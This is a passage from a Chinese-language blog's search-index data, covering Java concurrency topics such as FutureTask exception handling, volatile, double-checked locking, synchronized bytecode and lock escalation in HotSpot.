INTERRUPTED</li>\n</ul>\n<p>因为FutrueTask实现了Runnable接口，实际是通过JVM启动线程执行run方法。<br>FutrueTask的run方法实际上就是调用Callable的call方法，获取到方法返回值后，修改状态为COMPLETING，设置outcome为返回值，修改状态为NORMAL，通知其他等待的线程（在FutrueTask中有个链表维护等待的线程）。<br>FutrueTask通过get获取返回值，可以设置等待时间，之后会放入FutrueTask线程等待链表中。<br>FutrueTask其他方法如cancel之类的，可查看相关文档。</p>\n<ul>\n<li>注：FutrueTask中状态的变化都是通过UNSAFE操作的，保证了线程的安全。</li>\n</ul>\n<h3 id=\"多线程异常\"><a href=\"#多线程异常\" class=\"headerlink\" title=\"多线程异常\"></a>多线程异常</h3><p>在使用Runnable的时候，如果线程内发生异常，并不会向主线程抛出异常，这样导致主线程无法感知子线程中异常。如果需要处理子线程异常，需要在run方法中try catch代码块。举例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//异常发生时catch并不会被执行</span></span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(()-&gt;&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">i</span>  <span class=\"operator\">=</span> <span class=\"number\">1</span>/<span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;).start();</span><br><span class=\"line\">&#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\"><span class=\"comment\">//            e.printStackTrace();</span></span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;发生异常&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//改进需要在run方法中处理异常</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">1</span> / <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;发生异常&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;).start();</span><br></pre></td></tr></table></figure>\n<p>在FutrueTask.run方法中，调用Callable.call被try catch包裹</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//FutrueTask.run部分源码</span></span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    result = c.call();</span><br><span class=\"line\">    ran = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (Throwable ex) &#123;</span><br><span class=\"line\">    result = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    ran = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    setException(ex);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>catch后设置outcome为异常的值，同时设置当前状态为EXCEPTIONAL，当用户调用get时，判断当前状态，如果是异常状态，抛出该异常。</p>\n<p>在开发过程中，经常需要统一处理相关异常。这可在Thread.setUncaughtExceptionHandler设置线程异常处理。如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Thread</span> <span class=\"variable\">thread</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; String.valueOf(<span class=\"number\">1</span> / <span class=\"number\">0</span>));</span><br><span class=\"line\">thread.setUncaughtExceptionHandler((t, e) -&gt; System.out.println(<span class=\"string\">&quot;发生了异常&quot;</span>));</span><br><span class=\"line\">thread.start();</span><br></pre></td></tr></table></figure>\n","categories":["多线程学习"],"tags":["java","多线程"]},{"title":"Java并发同步基础","url":"/2017/12/13/Java%E5%B9%B6%E5%8F%91%E5%90%8C%E6%AD%A5%E5%9F%BA%E7%A1%80/","content":"<h3 id=\"volatile定义与实现原理\"><a href=\"#volatile定义与实现原理\" class=\"headerlink\" title=\"volatile定义与实现原理\"></a>volatile定义与实现原理</h3><p>Java编程语言允许线程访问共享变量，为了确保共享变量能被准确和一致的更新，线程应该确保通过排他锁单独获得这个变量。Java语言提供了volatile，在某些情况下比锁更加方便。如果一个字段被声明成volatile，Java线程内存模型确保所有线程看到这个变量的值是一致的。(Java语言规范第三版volatile定义)</p>\n<p>volatile主要作用为：</p>\n<ol>\n<li>禁止指令重排序优化</li>\n<li>保证内存一致性</li>\n</ol>\n<p>因为在写操作volatile修饰的变量时，会多出一行lock汇编代码。<br>在cpu操作时，会把部分数据缓存到CPU缓存里（L1、L2等）并未实时写回内存，如果对声明了volatile的变量进行写操作，会将当前变量所在的缓存行数据写回到系统内存，在多处理器下，为了保证其他处理核心缓存一致，会实现缓存一致协议，保证其他处理器检查当前缓存是否过期，后续操作时，会重新从系统内存中读取最新数据到缓存。简单来说，修改了volatile修饰的变量时，把CPU缓存中修改后的值及时写入内存，同时其他处理器设置自己缓存过期，使用时重新从系统内存中读取。</p>\n<span id=\"more\"></span>\n<p>编译器和处理器为了提高并行度，可能会对部分操作进行重排序，在单线程执行下，重排序并不会改变执行结果。编译器和处理器不会对存在数据依赖关系的操作做重排序，因为这种重排序会改变执行结果。但是，如果操作之间不存在数据依赖关系，这些操作可能被编译器和处理器重排序。（as-if-serial）</p>\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pbmZvcS5jb20vY24vYXJ0aWNsZXMvZnRmLWphdmEtdm9sYXRpbGU=\">聊聊并发（一）——深入分析Volatile的实现原理<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pbmZvcS5jb20vY24vYXJ0aWNsZXMvenptLWphdmEtaHNkaXMtanZt\">JVM执行篇：使用HSDIS插件分析JVM代码执行细节<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pbmZvcS5jb20vY24vYXJ0aWNsZXMvamF2YS1tZW1vcnktbW9kZWwtMi8=\">深入理解Java内存模型（二）——重排序<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<p>常规单例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Singleton</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Singleton singleton;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"title function_\">Singleton</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Singleton <span class=\"title function_\">getSingleton</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (singleton == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">synchronized</span> (Singleton.class)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (singleton == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                    singleton = <span class=\"keyword\">new</span> <span class=\"title class_\">Singleton</span>();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> singleton;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">out</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在单例设计模式中，采用双重检查锁来创建单例对象。因为可能出现指令重排序而导致该代码中有个安全隐患。<br>在代码 <strong>singleton &#x3D; new Singleton();</strong> 创建对象，其操作可拆解为：</p>\n<ol>\n<li>堆内存开辟空间准备初始化对象</li>\n<li>初始化对象</li>\n<li>singleton引用指向这个堆内存空间地址</li>\n</ol>\n<p>实际转换为汇编，不会仅仅这几个步骤。如果现在进行了指令重排序变为1、3、2，这并不影响最终执行结果，如果现在属性singleton引用指向了改内存地址，但是对象还未初始化完成，另外一个线程进入该方法后判断singleton不为空，返回的singleton对象调用其方法时就会出错，因为对象实际上并未初始化完成。解决办法，在singleton属性上加上volatile标识，（jdk1.5之后有效）或者使用临时变量，创建完成后在赋值到singleton。</p>\n<p>内存不一致性举例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TaskTest</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">boolean</span> stop;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (!stop) &#123;</span><br><span class=\"line\">            i++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">stop</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        stop = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">TaskTest</span> <span class=\"variable\">taskTest</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TaskTest</span>();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(taskTest).start();</span><br><span class=\"line\">        TimeUnit.SECONDS.sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">        taskTest.stop();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//TaskTest编译后代码</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TaskTest</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">boolean</span> stop;</span><br><span class=\"line\"></span><br><span class=\"line\">    TaskTest() &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> i;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; !<span class=\"built_in\">this</span>.stop; ++i) &#123;</span><br><span class=\"line\">            ;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">stop</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.stop = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在上述例子中，主线程启动了一个子线程，子线程有个循环，通过判断属性stop是否退出循环，之后主线程修改属性stop值，在实际运行中，子线程并不会退出循环，这就可能是因为stop被缓存到CPU缓存中，导致内存中数据修改，但是CPU缓存中的数据为过期数据，使循环无法退出。解决办法在stop属性中加入volatile修饰。</p>\n<h3 id=\"synchronized基本使用\"><a href=\"#synchronized基本使用\" class=\"headerlink\" title=\"synchronized基本使用\"></a>synchronized基本使用</h3><p>synchronized是实现同步的基础，Java中每个对象都可以作为一个锁，当一个线程试图访问同步代码块时，必须先获取锁。具体使用有3种方法：</p>\n<ol>\n<li>对普通方法同步，锁为当前实例对象。</li>\n<li>对静态方法同步，锁为当前类的Class对象</li>\n<li>对代码块进行同步，锁为括号内的对象</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SynchronizedDemo</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method1</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">synchronized</span> (<span class=\"built_in\">this</span>)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method2</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method3</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对改代码编译后，对该代码进行反编译。<br>第一个方法反编译部分如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method1</span><span class=\"params\">()</span>;</span><br><span class=\"line\">    descriptor: ()V</span><br><span class=\"line\">    flags: ACC_PUBLIC</span><br><span class=\"line\">    Code:</span><br><span class=\"line\">      stack=<span class=\"number\">2</span>, locals=<span class=\"number\">3</span>, args_size=<span class=\"number\">1</span></span><br><span class=\"line\">         <span class=\"number\">0</span>: aload_0</span><br><span class=\"line\">         <span class=\"number\">1</span>: dup</span><br><span class=\"line\">         <span class=\"number\">2</span>: astore_1</span><br><span class=\"line\">         <span class=\"number\">3</span>: monitorenter</span><br><span class=\"line\">         <span class=\"number\">4</span>: aload_1</span><br><span class=\"line\">         <span class=\"number\">5</span>: monitorexit</span><br><span class=\"line\">         <span class=\"number\">6</span>: <span class=\"keyword\">goto</span>          <span class=\"number\">14</span></span><br><span class=\"line\">         <span class=\"number\">9</span>: astore_2</span><br><span class=\"line\">        <span class=\"number\">10</span>: aload_1</span><br><span class=\"line\">        <span class=\"number\">11</span>: monitorexit</span><br><span class=\"line\">        <span class=\"number\">12</span>: aload_2</span><br><span class=\"line\">        <span class=\"number\">13</span>: athrow</span><br><span class=\"line\">        <span class=\"number\">14</span>: <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>代码中存在monitorenter（监视器锁进入），这个解释如下：<br>每个对象有一个监视器锁（monitor）。当monitor被占用时就会处于锁定状态，线程执行monitorenter指令时尝试获取monitor的所有权，过程如下：</p>\n<ul>\n<li>如果monitor的进入数为0，则该线程进入monitor，然后将进入数设置为1，该线程即为monitor的所有者。</li>\n<li>如果线程已经占有该monitor，只是重新进入，则进入monitor的进入数加1。</li>\n<li>如果其他线程已经占用了monitor，则该线程进入阻塞状态，直到monitor的进入数为0，再重新尝试获取monitor的所有权。</li>\n</ul>\n<p>monitorexit（监视器锁退出）：执行monitorexit的线程必须是objectref所对应的monitor的所有者。指令执行时，monitor的进入数减1，如果减1后进入数为0，那线程退出monitor，不再是这个monitor的所有者。其他被这个monitor阻塞的线程可以尝试去获取这个 monitor 的所有权。</p>\n<p>所以Synchronized的语义底层是通过一个monitor的对象来完成，其实wait&#x2F;notify等方法也依赖于monitor对象，这就是为什么只有在同步的块或者方法中才能调用wait&#x2F;notify等方法，否则会抛出java.lang.IllegalMonitorStateException的异常的原因。</p>\n<p>第二个方法显示如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method1</span><span class=\"params\">()</span>;</span><br><span class=\"line\">  descriptor: ()V</span><br><span class=\"line\">  flags: ACC_PUBLIC, ACC_SYNCHRONIZED</span><br><span class=\"line\">  Code:</span><br><span class=\"line\">    stack=<span class=\"number\">0</span>, locals=<span class=\"number\">1</span>, args_size=<span class=\"number\">1</span></span><br><span class=\"line\">       <span class=\"number\">0</span>: <span class=\"keyword\">return</span></span><br><span class=\"line\">    LineNumberTable:</span><br><span class=\"line\">      line <span class=\"number\">6</span>: <span class=\"number\">0</span></span><br><span class=\"line\">    LocalVariableTable:</span><br><span class=\"line\">      Start  Length  Slot  Name   Signature</span><br><span class=\"line\">          <span class=\"number\">0</span>       <span class=\"number\">1</span>     <span class=\"number\">0</span>  <span class=\"built_in\">this</span>   Lcom/whh/SynchronizedDemo;</span><br></pre></td></tr></table></figure>\n<p>在反编译后的代码中有ACC_PUBLIC（该方法为PUBLIC）ACC_SYNCHRONIZED（该方法为同步方法），JVM就是根据该标示符来实现方法的同步的：当方法调用时，调用指令将会检查方法的 ACC_SYNCHRONIZED 访问标志是否被设置，如果设置了，执行线程将先获取monitor，获取成功之后才能执行方法体，方法执行完后再释放monitor。在方法执行期间，其他任何线程都无法再获得同一个monitor对象。 其实本质上没有区别，只是方法的同步是一种隐式的方式来实现，无需通过字节码来完成。</p>\n<p>第三个方法反编译与第二个类似只是多个ACC_STATIC（静态方法）描述。</p>\n<h3 id=\"锁的升级\"><a href=\"#锁的升级\" class=\"headerlink\" title=\"锁的升级\"></a>锁的升级</h3><p>synchronized内部依赖于monitor，而monitor依赖于操作系统Mutex Lock线程之间锁的切换成本非常高，所以synchronized在jdk1.6以前效率非常低，在jdk1.6以后，为了减少获取锁释放锁带来性能消耗，引入了偏向锁、轻量级锁。之后锁有了4种状态：无锁状态&lt;偏向锁&lt;轻量级锁&lt;重量级锁。状态会随着竞争逐渐升级，但锁（偏向锁可能会变为无锁暂停）不会降级，目的是为了提高释放锁的效率。</p>\n<p>HotSpot虚拟机中，对象在内存中存储的布局可以分为三块区域：<strong>对象头（Header）</strong>、<strong>实例数据（Instance Data）</strong>和<strong>对齐填充（Padding）</strong>。HotSpot虚拟机的对象头(Object Header)包括两部分信息，第一部分用于存储对象自身的运行时数据， 如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等等，这部分数据的长度在32位和64位的虚拟机（暂 不考虑开启压缩指针的场景）中分别为32个和64个Bits，官方称它为<strong>Mark Word</strong>。<br>在32位JDK中存储如下：<br><img src=\"/images/old/20171213%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-12-13%E4%B8%8B%E5%8D%882.04.12.png\"></p>\n<h4 id=\"偏向锁\"><a href=\"#偏向锁\" class=\"headerlink\" title=\"偏向锁\"></a>偏向锁</h4><p>在很多情况下，锁并没有线程竞争，经常由同一个线程获取，HotSpot作者为了让线程获取锁的代价更低而引入了偏向锁。可以通过JVM参数关闭偏向锁：XX:-UseBiasedLocking&#x3D;false，程序会默认进入轻量级锁。</p>\n<p>偏向锁获取流程图如下：<br><img src=\"/images/old/20171213%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-12-13%E4%B8%8B%E5%8D%885.56.54.png\"><br>判断是否为偏向锁，如果为偏向锁，判断对象头的Mark Word里线程是否指向当前线程。如果不是需要采用CAS竞争锁，获取失败表示有竞争，当竞争达到全局安全点（safepoint）时，升级锁为轻量级锁。</p>\n<p>偏向锁释放：<br>偏向锁默认是不会释放，需要等到出现竞争时才会释放，当有其他线程尝试竞争偏向锁时，持有偏向锁的线程才会被释放。偏向锁释放，需要等待全局安全点（该点上没有正在执行的字节码）。先暂停拥有偏向锁的线程，检查线程是否活着，处于不活动状态，设置对象为无锁状态；如果线程仍然活着，拥有偏向锁的栈会被执行遍历偏向对象的锁记录，之后设置对象头的Mark Word要么查询偏向于其他线程，要么恢复到无锁或者升级为轻量级锁，最后唤醒暂停的线程（可以先看轻量级锁）。</p>\n<ul>\n<li>这里释放应该是，通过出现竞争时，有判断逻辑处理当前锁是否需要重新变为无锁、重偏向锁、升级为轻量级锁。</li>\n</ul>\n<p>锁转换：<br><img src=\"/images/old/20171213%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-12-13%E4%B8%8B%E5%8D%883.52.56.png\"></p>\n<p><strong>偏向锁主要是为了优化同一线程频繁访问锁。</strong></p>\n<h4 id=\"轻量级锁\"><a href=\"#轻量级锁\" class=\"headerlink\" title=\"轻量级锁\"></a>轻量级锁</h4><p>轻量级锁加锁过程：</p>\n<ol>\n<li>在代码进入同步块的时候，如果同步对象锁状态为无锁状态（锁标志位为“01”状态，是否为偏向锁为“0”），虚拟机首先将在当前线程的栈帧中建立一个名为锁记录（Lock Record）的空间，用于存储锁对象目前的Mark Word的拷贝，官方称之为 Displaced Mark Word。</li>\n<li>拷贝对象头中的Mark Word复制到锁记录中</li>\n<li>拷贝成功后，虚拟机将使用CAS操作尝试将对象的Mark Word更新为指向Lock Record的指针，并将Lock Record里的owner指针指向object mark word。</li>\n<li>更新成功，者当前线程拥有该对象的锁。设置Mark Word锁标志为00.</li>\n<li>CAS多次更新不成功，虚拟机检查对象Mark Word是否指向当前线程的栈帧，如果是表示当前线程已经获取了对象的锁，进入同步块执行。如果不是表示存在线程竞争，轻量级锁变为重量级锁，锁标志变为10。Mark Work中存储的是指向重量级锁的指针，后面等待锁的线程会进入阻塞状态。当前线程会使用CAS来获取锁，目的是为了不让线程阻塞。</li>\n</ol>\n<p>轻量级锁解锁过程：</p>\n<ol>\n<li>通过CAS把线程中复制的Displaced Mark Word对象替换为当前的Mark Word</li>\n<li>替换成功，同步完成结束</li>\n<li>替换失败，说明有其他线程尝试获取锁，锁已经变为重量级锁，需要释放锁的同时唤醒其他被挂起的线程。</li>\n</ol>\n<p>轻量级锁升级为重量级锁，是为了避免资源消耗。轻量级锁没有太多空间存储额外的状态，太多线程自旋太消耗CPU资源。可参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQxOTMwODc3L2Fuc3dlci8xMzY2OTkzMTE=\">https://www.zhihu.com/question/41930877/answer/136699311<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h4 id=\"重量级锁\"><a href=\"#重量级锁\" class=\"headerlink\" title=\"重量级锁\"></a>重量级锁</h4><p>重量级锁依赖monitor，当一个线程进入同步代码块，其他线程会被阻塞在外，当线程执行完毕后释放锁，同时唤醒其他等待线程。</p>\n<p>锁之间图解：<br><img src=\"/images/old/20171213v2-9db4211af1be81785f6cc51a58ae6054_r.jpg\"></p>\n<h4 id=\"锁比较\"><a href=\"#锁比较\" class=\"headerlink\" title=\"锁比较\"></a>锁比较</h4><table>\n<thead>\n<tr>\n<th>锁</th>\n<th align=\"left\">优点</th>\n<th align=\"left\">缺点</th>\n<th align=\"left\">场景</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>偏向锁</td>\n<td align=\"left\">资源消耗少，同步方法月非同步方法差距不大</td>\n<td align=\"left\">如果存在线程竞争，锁撤销消耗资源</td>\n<td align=\"left\">单一线程访问</td>\n</tr>\n<tr>\n<td>轻量级锁</td>\n<td align=\"left\">线程竞争响应时间快</td>\n<td align=\"left\">如果一直得不到锁，CPU自旋消耗资源</td>\n<td align=\"left\">同步代码块执行速度快，线程交替执行，竞争少</td>\n</tr>\n<tr>\n<td>重量级锁</td>\n<td align=\"left\">无自旋，CPU消耗少</td>\n<td align=\"left\">线程阻塞，响应慢</td>\n<td align=\"left\">追求吞吐量，代码块执行速度长</td>\n</tr>\n</tbody></table>\n<h3 id=\"虚拟机其他优化\"><a href=\"#虚拟机其他优化\" class=\"headerlink\" title=\"虚拟机其他优化\"></a>虚拟机其他优化</h3><p>适应性自旋（Adaptive Spinning）：从轻量级锁获取的流程中我们知道，当线程在获取轻量级锁的过程中执行CAS操作失败时，是要通过自旋来获取重量级锁的。问题在于，自旋是需要消耗CPU的，如果一直获取不到锁的话，那该线程就一直处在自旋状态，白白浪费CPU资源。解决这个问题最简单的办法就是指定自旋的次数，例如让其循环10次，如果还没获取到锁就进入阻塞状态。但是JDK采用了更聪明的方式——适应性自旋，简单来说就是线程如果自旋成功了，则下次自旋的次数会更多，如果自旋失败了，则自旋的次数就会减少。</p>\n<p>锁粗化（Lock Coarsening）：锁粗化的概念应该比较好理解，就是将多次连接在一起的加锁、解锁操作合并为一次，将多个连续的锁扩展成一个范围更大的锁。举个例子：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">StringBufferTest</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">StringBuffer</span> <span class=\"variable\">stringBuffer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuffer</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">append</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        stringBuffer.append(<span class=\"string\">&quot;a&quot;</span>);</span><br><span class=\"line\">        stringBuffer.append(<span class=\"string\">&quot;b&quot;</span>);</span><br><span class=\"line\">        stringBuffer.append(<span class=\"string\">&quot;c&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>锁消除（Lock Elimination）：锁消除即删除不必要的加锁操作。根据代码逃逸技术，如果判断到一段代码中，堆上的数据不会逃逸出当前线程，那么可以认为这段代码是线程安全的，不必要加锁。看下面这段程序：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//禁用了偏向锁</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SynchronizedTest02</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">SynchronizedTest02</span> <span class=\"variable\">test02</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SynchronizedTest02</span>();</span><br><span class=\"line\">        <span class=\"comment\">//启动预热</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10000</span>; i++) &#123;</span><br><span class=\"line\">            i++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">start</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">100000000</span>; i++) &#123;</span><br><span class=\"line\">            test02.append(<span class=\"string\">&quot;abc&quot;</span>, <span class=\"string\">&quot;def&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Time=&quot;</span> + (System.currentTimeMillis() - start));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">append</span><span class=\"params\">(String str1, String str2)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">StringBuffer</span> <span class=\"variable\">sb</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuffer</span>();</span><br><span class=\"line\">        sb.append(str1).append(str2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9wYWRkaXgvcC81NDA1Njc4Lmh0bWw=\">http://www.cnblogs.com/paddix/p/5405678.html<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzU3Nzc0MTYyL2Fuc3dlci8xNTQyOTgwNDQ=\">https://www.zhihu.com/question/57774162/answer/154298044<i class=\"fa 